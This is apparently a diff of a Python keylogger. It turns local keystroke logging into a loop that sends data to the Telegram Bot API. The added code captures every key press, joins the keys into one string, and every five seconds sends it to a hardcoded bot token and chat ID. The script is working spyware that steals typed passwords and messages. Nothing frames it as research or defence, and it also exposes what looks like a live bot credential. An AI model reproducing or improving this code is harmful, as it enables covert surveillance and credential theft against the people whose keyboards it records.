@@ -1,35 +1,39 @@
+import time
 import keyboard
-import logging
 import threading
+import requests
 
-from utils import setup_logging
-from telegram.client import Telegram
 
-log_file = 'keystrokes.txt'
+Token_api = "6818202233:AAG4GpF8DWZhKFp9kpgFESQq_4En4WJkp5A"
+chat_id = "1579016671"
+
+# url = f"https://api.telegram.org/bot{Token_api}/sendMessage?chat_id=1579016671&text={}"
+
+# res = requests.get(url)
+# print(res.json())
 
 try:
-    tg = Telegram(
-            api_id="",
-            api_hash="",
-            phone="",
-            database_encryption_key="changeme1234",
-        )
+    data = ""
     def on_key_press(event):
-        # with open(log_file, 'a') as f:
-        #     f.write('{}\n'.format(event.name))
+        global data
+        try:
+            data += event.name
+        except:
+            pass
 
-        send_message_result = tg.send_message(
-            chat_id=args.chat_id,
-            text=args.text,
-        )
-        send_message_result.wait()
-
-        if send_message_result.error:
-            print(f"Failed to send the message: {send_message_result.error_info}")
+    def send_logs():
+        global data
+        requests.get(f"https://api.telegram.org/bot{Token_api}/sendMessage?chat_id=1579016671&text={data}")
+        data = ''
+        threading.Timer(5, send_logs).start()
 
     keyboard.on_press(on_key_press)
-
     keyboard.wait()
+
+    
 
 except KeyboardInterrupt:
     print('Exiting...')
+
+
+
